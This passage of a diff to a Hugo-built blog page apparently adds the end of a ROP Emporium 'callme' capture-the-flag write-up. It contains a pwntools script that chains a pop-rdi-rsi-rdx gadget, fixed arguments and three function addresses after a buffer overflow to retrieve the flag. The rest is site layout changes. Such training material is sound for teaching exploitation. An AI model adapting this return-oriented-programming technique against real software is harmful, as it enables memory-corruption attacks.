+pop_rdi_rsi_rdx <span style="color:#5bc4bf">=</span> pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0x0040093c</span>)  <span style="color:#776e71">#pop rdi; pop rsi; pop rdx; ret gadget</span>
+arg1 <span style="color:#5bc4bf">=</span> pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0xdeadbeefdeadbeef</span>)
+arg2 <span style="color:#5bc4bf">=</span> pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0xcafebabecafebabe</span>)
+arg3 <span style="color:#5bc4bf">=</span> pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0xd00df00dd00df00d</span>)
+
+
+callme_one_addr <span style="color:#5bc4bf">=</span> pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0x0000000000400720</span>)
+callme_two_addr <span style="color:#5bc4bf">=</span> pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0x0000000000400740</span>)
+callme_three_addr <span style="color:#5bc4bf">=</span>pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0x00000000004006f0</span>)
+
+<span style="color:#776e71">#call the callme_one function</span>
+callme_one <span style="color:#5bc4bf">=</span> pop_rdi_rsi_rdx
+callme_one <span style="color:#5bc4bf">+=</span> arg1
+callme_one <span style="color:#5bc4bf">+=</span> arg2
+callme_one <span style="color:#5bc4bf">+=</span> arg3
+callme_one <span style="color:#5bc4bf">+=</span> callme_one_addr
+
+<span style="color:#776e71">#callme_two function</span>
+callme_two <span style="color:#5bc4bf">=</span> pop_rdi_rsi_rdx
+callme_two <span style="color:#5bc4bf">+=</span> arg1
+callme_two <span style="color:#5bc4bf">+=</span> arg2
+callme_two  <span style="color:#5bc4bf">+=</span> arg3
+callme_two <span style="color:#5bc4bf">+=</span> callme_two_addr
+
+<span style="color:#776e71">#callme_three function</span>
+callme_three <span style="color:#5bc4bf">=</span> pop_rdi_rsi_rdx
+callme_three <span style="color:#5bc4bf">+=</span> arg1
+callme_three <span style="color:#5bc4bf">+=</span> arg2
+callme_three <span style="color:#5bc4bf">+=</span> arg3
+callme_three <span style="color:#5bc4bf">+=</span> callme_three_addr
+
+payload <span style="color:#5bc4bf">=</span> <span style="color:#48b685">b</span><span style="color:#48b685">&#34;A&#34;</span> <span style="color:#5bc4bf">*</span><span style="color:#f99b15">32</span>   <span style="color:#776e71">#fill the buffer</span>
+payload <span style="color:#5bc4bf">+=</span> <span style="color:#48b685">b</span><span style="color:#48b685">&#34;B&#34;</span> <span style="color:#5bc4bf">*</span> <span style="color:#f99b15">8</span>  <span style="color:#776e71">#overwrite the rbp</span>
+payload <span style="color:#5bc4bf">+=</span> callme_one
+payload <span style="color:#5bc4bf">+=</span> callme_two
+payload <span style="color:#5bc4bf">+=</span> callme_three
+
+
+io<span style="color:#5bc4bf">.</span>writeafter(<span style="color:#48b685">&#39;&gt;&#39;</span>, payload)
+
+pwn<span style="color:#5bc4bf">.</span>info(io<span style="color:#5bc4bf">.</span>clean()<span style="color:#5bc4bf">.</span>decode())
+
+</code></pre></div><p>Successful execution of the above code, we get rewarded with a correct flag.</p>
+<p><figure 
+	>
+	<a href="/post/ropemporium/callme-flag.png" >
+		<img src="/post/ropemporium/callme-flag.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+
 </section>
 
 
@@ -285,7 +344,7 @@
     
     <section class="article-tags">
         
-            <a href="/tags/ropemprium/">ropemprium</a>
+            <a href="/tags/ropemporium/">ropemporium</a>
         
             <a href="/tags/rop/">rop</a>
         
@@ -300,6 +359,8 @@
     
 </article>
 
+    
+
     <aside class="related-contents--wrapper">
     
     
@@ -308,9 +369,15 @@
             <div class="flex article-list--tile">
                 
                     
-<article class="">
+<article class="has-image">
     <a href="/p/return-oriented-programming-retcsu/">
         
+        
+            <div class="article-image">
+                
+                    <img src="/post/ropemporium/retcsu.jpg" loading="lazy" data-key="" data-hash="/post/ropemporium/retcsu.jpg"/>
+                
+            </div>
         
 
         <div class="article-details">
@@ -320,49 +387,55 @@
 </article>
                 
                     
-<article class="">
-    <a href="/p/return-oriented-programming-pivot/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Return-Oriented Programming - Pivot</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="">
-    <a href="/p/return-oriented-programming-fluff/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Return-Oriented Programming - Fluff</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="">
-    <a href="/p/return-oriented-programming-badchars/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Return-Oriented Programming - Badchars</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="">
+<article class="has-image">
     <a href="/p/return-oriented-programming-write4/">
         
+        
+            <div class="article-image">
+                
+                    <img src="/post/ropemporium/write4.jpg" loading="lazy" data-key="" data-hash="/post/ropemporium/write4.jpg"/>
+                
+            </div>
         
 
         <div class="article-details">
             <h2 class="article-title">Return-Oriented Programming - Write4</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/return-oriented-programming-split/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/ropemporium/split.jpg" loading="lazy" data-key="" data-hash="/post/ropemporium/split.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Return-Oriented Programming - Split</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/return-oriented-programming-ret2win/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/ropemporium/ret2win.jpg" loading="lazy" data-key="" data-hash="/post/ropemporium/ret2win.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Return-Oriented Programming - Ret2win</h2>
         </div>
     </a>
 </article>
@@ -383,12 +456,12 @@
         
             2020 - 
         
-        2021 Solar Bits
+        2022 Solar Bits
     </section>
     
     <section class="powerby">
         Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.6.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
     </section>
 </footer>
 
@@ -472,6 +545,33 @@
             >
 
             </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">Table of contents</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#exploit">Exploit</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
     
 
         </div>
